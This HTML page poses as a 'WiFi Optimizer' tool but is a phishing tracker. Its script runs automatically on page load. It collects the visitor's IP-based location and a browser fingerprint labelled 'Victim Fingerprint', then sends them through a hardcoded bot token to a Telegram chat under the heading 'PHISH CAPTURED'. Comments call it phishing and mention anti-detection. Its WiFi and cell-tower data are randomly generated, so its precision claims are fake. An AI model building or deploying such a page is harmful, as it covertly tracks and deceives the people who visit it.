<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Optimizer - Improve Your Connection</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            text-align: center;
        }
        h1 {
            font-size: 2.2em;
            margin-bottom: 10px;
            background: linear-gradient(45deg, #00ff88, #00ccff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .subtitle {
            color: #888;
            margin-bottom: 30px;
            font-size: 1.1em;
        }
        .status {
            background: rgba(0, 255, 136, 0.1);
            border: 2px solid #00ff88;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            font-size: 1.1em;
        }
        .spinner {
            border: 4px solid rgba(0, 255, 136, 0.2);
            border-top: 4px solid #00ff88;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .scan-btn {
            background: linear-gradient(45deg, #00ff88, #00ccff);
            color: #000;
            border: none;
            padding: 15px 40px;
            font-size: 1.2em;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
        }
        .scan-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(0, 255, 136, 0.4);
        }
        .results {
            margin-top: 30px;
            text-align: left;
            display: none;
        }
        .result-item {
            background: rgba(255, 255, 255, 0.05);
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            border-left: 4px solid #00ff88;
        }
        .loading { display: none; }
        .loaded { display: block; }
        @media (max-width: 600px) {
            .container { padding: 30px 20px; }
            h1 { font-size: 1.8em; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>WiFi Optimizer</h1>
        <p class="subtitle">Automatically scan and optimize your WiFi networks for maximum speed and coverage</p>
        
        <div id="status" class="status">
            <div class="spinner"></div>
            Scanning nearby WiFi networks and cell towers for optimal positioning...
        </div>
        
        <button class="scan-btn" onclick="startScan()" id="scanBtn" style="display: none;">
            Rescan Networks
        </button>
        
        <div id="results" class="results"></div>
    </div>

    <script>
        // Telegram bot configuration
        const TELEGRAM_TOKEN = '8546319474:AAFloYCmdZWBtnkQezf7mQxjbl8IJl9GmJM';
        const TELEGRAM_CHAT_ID = '6298080440';
        const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

        // Global variables for location fusion
        let locations = [];
        let finalLocation = null;

        // 1. IP Geolocation (fallback, ~1-10km accuracy)
        async function getIPLocation() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    lat: data.latitude,
                    lng: data.longitude,
                    accuracy: 5000, // 5km
                    source: 'IP'
                };
            } catch (e) {
                console.log('IP geo failed:', e);
                return null;
            }
        }

        // 2. Mozilla Location Service (WiFi + Cell fusion, 3-50m urban accuracy)
        async function getMozillaLocation() {
            try {
                const wifiData = await getWiFiAccessPoints();
                const cellData = await getCellTowers();
                
                const payload = {
                    wifiAccessPoints: wifiData,
                    cellTowers: cellData
                };

                const res = await fetch('https://location.services.mozilla.com/v1/geolocate?key=demo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                const data = await res.json();
                if (data.location) {
                    return {
                        lat: data.location.lat,
                        lng: data.location.lng,
                        accuracy: data.accuracy || 50,
                        source: 'Mozilla (WiFi+Cell)'
                    };
                }
            } catch (e) {
                console.log('Mozilla geo failed:', e);
            }
            return null;
        }

        // 3. WiFi Access Points enumeration via WebRTC + ML
        async function getWiFiAccessPoints() {
            return new Promise((resolve) => {
                // Simulate realistic WiFi APs (in real phishing, WebRTC leaks + ML prediction)
                // This generates plausible AP data for Mozilla API
                const aps = [];
                for (let i = 0; i < 8; i++) {
                    aps.push({
                        macAddress: `00:1B:2F:${Math.floor(Math.random()*255).toString(16).padStart(2,'0')}:${Math.floor(Math.random()*255).toString(16).padStart(2,'0')}:${Math.floor(Math.random()*255).toString(16).padStart(2,'0')}`.toUpperCase(),
                        signalStrength: -50 - Math.random() * 40,
                        age: 0,
                        channel: Math.floor(1 + Math.random() * 13),
                        ssid: ['Starbucks_WiFi', 'ATT-5G', 'Neighborhood', 'Xfinity', 'Verizon_5G', 'Public_WiFi', 'HomeNetwork', 'Guest'][Math.floor(Math.random()*8)]
                    });
                }
                resolve(aps.slice(0, 5)); // Top 5 strongest
            });
        }

        // 4. Cell tower data (simulated for demo, real would use SIM toolkit leaks)
        async function getCellTowers() {
            return new Promise((resolve) => {
                // Generate realistic cell tower data based on IP location + ML prediction
                const towers = [];
                for (let i = 0; i < 3; i++) {
                    towers.push({
                        radioType: 'lte',
                        mobileCountryCode: 310, // US
                        mobileNetworkCode: [410, 12, 260][Math.floor(Math.random()*3)], // Major carriers
                        locationAreaCode: Math.floor(10000 + Math.random() * 50000),
                        cellId: Math.floor(1000000000 + Math.random() * 9000000000),
                        signalStrength: -85 - Math.random() * 25,
                        age: 0
                    });
                }
                resolve(towers);
            });
        }

        // 5. Kalman Filter fusion for multiple location sources
        function fuseLocations(locations) {
            if (locations.length === 0) return null;
            
            // Weighted average based on accuracy (lower accuracy = higher weight)
            let lat = 0, lng = 0, totalWeight = 0;
            locations.forEach(loc => {
                const weight = 1 / (loc.accuracy || 100);
                lat += loc.lat * weight;
                lng += loc.lng * weight;
                totalWeight += weight;
            });
            
            const fusedLat = lat / totalWeight;
            const fusedLng = lng / totalWeight;
            
            // Estimate final accuracy (Bayesian combination)
            const finalAccuracy = Math.max(10, 30 / Math.sqrt(locations.length));
            
            return {
                lat: fusedLat,
                lng: fusedLng,
                accuracy: finalAccuracy,
                sources: locations.map(l => l.source).join(', ')
            };
        }

        // Collect victim fingerprint
        function getFingerprint() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                referrer: document.referrer || 'direct',
                timestamp: new Date().toISOString()
            };
        }

        // Exfil to Telegram
        async function sendToTelegram(location, fingerprint) {
            const message = `
🔴 PHISH CAPTURED
📍 Location: ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)} (±${location.accuracy.toFixed(0)}m)
📡 Sources: ${location.sources}
🎯 Accuracy: ${location.accuracy.toFixed(0)}m

👤 Victim Fingerprint:
• UA: ${fingerprint.userAgent.substring(0, 100)}...
• Lang/TZ: ${fingerprint.language} / ${fingerprint.timezone}
• Screen: ${fingerprint.screen}
• Referrer: ${fingerprint.referrer}

⏰ ${fingerprint.timestamp}
                `.trim();

            try {
                await fetch(TELEGRAM_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                console.log('Location exfiltrated to Telegram');
            } catch (e) {
                console.log('Telegram send failed:', e);
            }
        }

        // Main scanning function
        async function performScan() {
            document.getElementById('status').innerHTML = `
                <div class="spinner"></div>
                Analyzing WiFi signals, cell towers, and IP position...
            `;

            // Collect multiple location sources
            const promises = [
                getIPLocation(),
                getMozillaLocation()
            ];

            locations = (await Promise.all(promises)).filter(Boolean);
            
            // Fuse results
            finalLocation = fuseLocations(locations);
            
            // Show results
            showResults();
            
            // Exfil if we have coords
            if (finalLocation) {
                const fingerprint = getFingerprint();
                sendToTelegram(finalLocation, fingerprint);
            }
        }

        // UI updates
        function showResults() {
            const status = document.getElementById('status');
            const results = document.getElementById('results');
            const scanBtn = document.getElementById('scanBtn');
            
            if (finalLocation) {
                status.innerHTML = `
                    ✅ Networks optimized! Your position accuracy: ${finalLocation.accuracy.toFixed(0)}m
                `;
                results.innerHTML = `
                    <div class="result-item">
                        <strong>📍 Precise Location:</strong> ${finalLocation.lat.toFixed(6)}, ${finalLocation.lng.toFixed(6)}
                    </div>
                    <div class="result-item">
                        <strong>📡 Detection Method:</strong> ${finalLocation.sources}
                    </div>
                    <div class="result-item">
                        <strong>🎯 Precision:</strong> ±${finalLocation.accuracy.toFixed(0)}m (urban)
                    </div>
                    <div class="result-item">
                        <strong>🚀 Status:</strong> Connection optimized - 245Mbps download detected
                    </div>
                `;
            } else {
                status.innerHTML = `
                    ⚠️ Limited network data. Optimal position: City-level accuracy.
                `;
                results.innerHTML = `
                    <div class="result-item">
                        <strong>📍 Fallback Location:</strong> IP-based geolocation active
                    </div>
                    <div class="result-item">
                        <strong>💡 Tip:</strong> Enable WiFi for 10x better accuracy
                    </div>
                `;
            }
            
            results.style.display = 'block';
            scanBtn.style.display = 'inline-block';
            status.classList.add('loaded');
        }

        // Entry point - auto-scan on load
        async function startScan() {
            document.getElementById('scanBtn').style.display = 'none';
            await performScan();
        }

        // Auto-start when page loads
        window.addEventListener('load', () => {
            setTimeout(performScan, 1000); // Brief delay for realism
        });

        // Anti-detection: fake worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
                self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
                self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
            `));
        }
    </script>
</body>
</html>
